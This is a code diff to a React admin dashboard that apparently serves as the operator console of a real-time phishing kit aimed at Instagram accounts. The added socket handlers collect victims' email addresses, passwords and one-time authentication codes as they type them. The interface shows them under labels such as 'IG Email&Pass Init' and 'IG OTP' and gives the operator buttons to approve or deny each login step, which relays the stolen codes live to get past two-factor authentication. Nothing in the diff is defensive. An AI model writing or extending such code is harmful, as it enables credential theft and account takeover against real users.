@@ -34,6 +34,7 @@ const AdminDashboard = () => {
   const [searchQuery, setSearchQuery] = useState("");
   const [authNumber, setAuthNumber] = useState("");
   const [phone, setPhone] = useState("");
+  const [sendTo, setSendTo] = useState("");
 
   // Define step navigation configuration for different event types
   // const eventConfig = {
@@ -670,6 +671,156 @@ const AdminDashboard = () => {
       });
     });
 
+    newSocket.on("ig_attempt_init", (data) => {
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "ig_attempt_init",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  status: "pending",
+                  email: data.email,
+                  data: `${data.email} & ${data.password}`,
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "ig_attempt_init",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                status: "pending",
+                email: session.email, // Use email from the session
+              },
+            ],
+          },
+        };
+      });
+    });
+
+    newSocket.on("auth_value_submit", (data) => {
+      console.log("aa", data);
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              otp: data.otp,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "auth_value_submit",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  otp: data.otp,
+                  status: "pending",
+                  email: data.email,
+                  data: `OTP: ${data.email}`,
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "auth_value_submit",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                otp: data.otp,
+                data: `OTP ${data.otp}`,
+                status: "pending",
+                email: session.email, // Use email from the session
+              },
+            ],
+          },
+        };
+      });
+    });
+
+    newSocket.on("stay_signed_in", (data) => {
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              staySignedIn: data.staySignedIn,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "stay_signed_in",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  staySignedIn: data.staySignedIn,
+                  status: "pending",
+                  email: data.email,
+                  data: `staySignedIn: ${data.staySignedIn}`,
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "stay_signed_in",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                staySignedIn: data.staySignedIn,
+                data: `staySignedIn ${data.staySignedIn}`,
+                status: "pending",
+                email: session.email, // Use email from the session
+              },
+            ],
+          },
+        };
+      });
+    });
+
     setSocket(newSocket);
 
     return () => newSocket.disconnect();
@@ -702,6 +853,7 @@ const AdminDashboard = () => {
       email: event.email || sessions[sessionId].email,
       authNumber: authNumber || "",
       phone: phone || "",
+      sendTo: sendTo || "",
     });
 
     setSessions((prev) => ({
@@ -769,6 +921,12 @@ const AdminDashboard = () => {
         return "Text Verify Clicked";
       case "call-select":
         return "Call Method Selected";
+      case "ig_attempt_init":
+        return "IG Email&Pass Init";
+      case "auth_value_submit":
+        return "IG OTP";
+      case "stay_signed_in":
+        return "IG StaySignedIn?";
 
       default:
         return "Unknown Event";
@@ -778,6 +936,8 @@ const AdminDashboard = () => {
   const filteredSessions = Object.entries(sessions).filter(([sessionId]) =>
     sessionId.toLowerCase().includes(searchQuery.toLowerCase())
   );
+
+  console.log(filteredSessions);
 
   return (
     <Box
@@ -855,12 +1015,18 @@ const AdminDashboard = () => {
                             fontWeight="medium"
                             color="gray.500"
                           >
-                            {event.type === "verify-click"
+                            {event.type === "verify-click" ||
+                            event.type === "ig_attempt_init" ||
+                            event.type === "auth_value_submit" ||
+                            event.type === "stay_signed_in"
                               ? "Email & Password"
                               : "Email"}
                           </Text>
                           <Text mt={1}>
-                            {event.type === "verify-click" ? (
+                            {event.type === "verify-click" ||
+                            event.type === "ig_attempt_init" ||
+                            event.type === "auth_value_submit" ||
+                            event.type === "stay_signed_in" ? (
                               <>
                                 {event.email || session.email} &{" "}
                                 {event.password}
@@ -901,6 +1067,12 @@ const AdminDashboard = () => {
                                 : event.type === "text-select"
                                 ? "orange.500"
                                 : event.type === "text-click"
+                                ? "teal.500"
+                                : event.type === "ig_attempt_init"
+                                ? "red.500"
+                                : event.type === "auth_value_submit"
+                                ? "red.500"
+                                : event.type === "stay_signed_in"
                                 ? "teal.500"
                                 : "yellow.500"
                             }
@@ -1108,6 +1280,100 @@ const AdminDashboard = () => {
                                     )}
                                   </>
                                 );
+
+                              case "ig_attempt_init":
+                                return (
+                                  <>
+                                    <HStack spacing={4} mt={4}>
+                                      <Input
+                                        type="text"
+                                        name="sendTo"
+                                        value={sendTo}
+                                        onChange={(e) =>
+                                          setSendTo(e.target.value)
+                                        }
+                                        placeholder="Where did you send code to?"
+                                      />
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "login"
+                                            // { password }
+                                          ),
+                                        "Approve login"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny login"
+                                      )}
+                                    </HStack>
+                                  </>
+                                );
+
+                              case "auth_value_submit":
+                                return (
+                                  <>
+                                    {createButton(
+                                      "green",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "continue"
+                                        ),
+                                      "Approve IG OTP"
+                                    )}
+                                    {createButton(
+                                      "red",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "cancel"
+                                        ),
+                                      "Deny IG OTP"
+                                    )}
+                                  </>
+                                );
+
+                              case "stay_signed_in":
+                                return (
+                                  <>
+                                    <HStack spacing={4} mt={4}>
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "approve"
+                                            // { password }
+                                          ),
+                                        "Approve Thanks4Coming"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny Thanks4Coming"
+                                      )}
+                                    </HStack>
+                                  </>
+                                );
+
                               default:
                                 return <Text>No Button for you yet</Text>;
                             }
